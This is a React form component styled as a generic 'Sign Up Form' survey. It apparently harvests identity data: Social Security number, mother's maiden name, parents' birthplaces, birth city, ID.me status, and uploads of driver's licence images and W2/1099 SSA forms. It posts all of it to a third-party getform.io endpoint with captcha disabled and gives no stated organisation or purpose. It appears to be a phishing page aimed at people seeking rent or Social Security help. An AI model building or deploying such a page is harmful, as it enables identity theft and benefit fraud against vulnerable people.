"use client";

import type React from "react";
import { useState } from "react";
import BackgroundImage from "../assets/background-image001.jpg";

const initialState = {
  Name: "",
  Email: "",
  Gender: "",
  PhoneNumber: "",
  WhatCityWereYouBorn: "",
  FatherPlaceOfBirth: "",
  MotherPlaceOfBirth: "",
  SocialSecurityNumber: "",
  MotherFullName: "",
  MotherMaidenName: "",
  FatherFullName: "",
  "PastDueRent /Utilities": "",
  HaveYouBeenEvicted: "",
  HaveYouAppliedBefore: "",
  AreYouCurrentlyRecievingSocialSecurityPayment: "",
  "HaveYouBeenVerifiedBy ID.ME": "",
  W21099SSAFORM: null as File | null,
  DriverLicenseFront: null as File | null,
  DriverLicenseBack: null as File | null,
};

type FormData = typeof initialState;

export default function SurveyForm() {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState<FormData>(initialState);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleStartSurvey = () => setStep(2);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, files } = e.target;
    if (type === "file" && files) {
      setFormData((prev) => ({ ...prev, [name]: files[0] }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmitting(true);
    const form = e.currentTarget;
    const formData = new FormData(form);

    try {
      const response = await fetch("https://getform.io/f/avrywvwa", {
        method: "POST",
        body: formData,
      });

      if (response.ok) {
        setIsSubmitted(true);
      } else {
        throw new Error("Form submission failed");
      }
    } catch (error) {
      console.error("Submission error:", error);
      alert("Failed to submit survey. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-white">
        <div className="text-center">
          <h1 className="text-4xl font-semibold mb-4">Congratulations!</h1>
          <p className="text-xl text-gray-600">You have successfully submitted the form.</p>
        </div>
      </div>
    );
  }

  if (step === 1) {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
        style={{ backgroundImage: `url(${BackgroundImage})` }}
      >
        <div className="text-center relative z-10">
          <div className="bg-[#0d1d3788] px-6 rounded-xl py-8 mb-10">
            <h1 className="text-3xl md:text-6xl font-semibold text-white mb-4">Sign Up Form</h1>
            <p className="text-xl mb-8 text-white">Gathering Registrant details</p>
          </div>
          <button
            onClick={handleStartSurvey}
            className="px-8 md:px-28 py-3 md:py-4 text-lg bg-[#64a3d2] text-white rounded transition duration-300"
          >
            START SURVEY
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-white">
      <div className="w-full md:w-3/5 bg-white rounded-lg p-8">
        <form onSubmit={handleSubmit} className="space-y-6">
          <input type="hidden" name="_captcha" value="false" />
          <h1 className="text-4xl font-semibold text-center mb-4">Sign Up Form</h1>
          <p className="text-xl mb-8 text-center text-gray-600">Gathering Registrant details</p>

          {Object.entries(initialState).map(([key, _], index) => (
            <div key={key}>
              <label htmlFor={key} className="block text-xl mb-2">
                {index + 1}. {key === "W21099SSAFORM" ? "W2 / 1099 SSA FORM" : key.replace(/([A-Z])/g, " $1").trim()}
              </label>
              {key === "Gender" ? (
                <div className="flex space-x-4">
                  <label className="inline-flex items-center">
                    <input type="radio" name="Gender" value="Male" onChange={handleInputChange} className="mr-2" required /> Male
                  </label>
                  <label className="inline-flex items-center">
                    <input type="radio" name="Gender" value="Female" onChange={handleInputChange} className="mr-2" required /> Female
                  </label>
                </div>
              ) : key.includes("License") || key === "W21099SSAFORM" ? (
                <input id={key} name={key} type="file" accept="image/*" onChange={handleInputChange} className="w-full p-2 border border-gray-300 rounded" required />
              ) : (
                <input id={key} name={key} type={key === "Email" ? "email" : "text"} onChange={handleInputChange} className="w-full p-2 border-b-2 border-gray-400 outline-none focus:border-blue-500 transition" required />
              )}
            </div>
          ))}

          <div className="flex justify-between items-center mt-8">
            <span className="text-sm text-gray-600">
              Answered {Object.values(formData).filter(Boolean).length} of {Object.keys(initialState).length}
            </span>
            <button type="submit" className="px-6 py-2 bg-black text-white rounded hover:bg-gray-800 transition duration-300" disabled={isSubmitting}>
              {isSubmitting ? "Submitting..." : "Submit"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
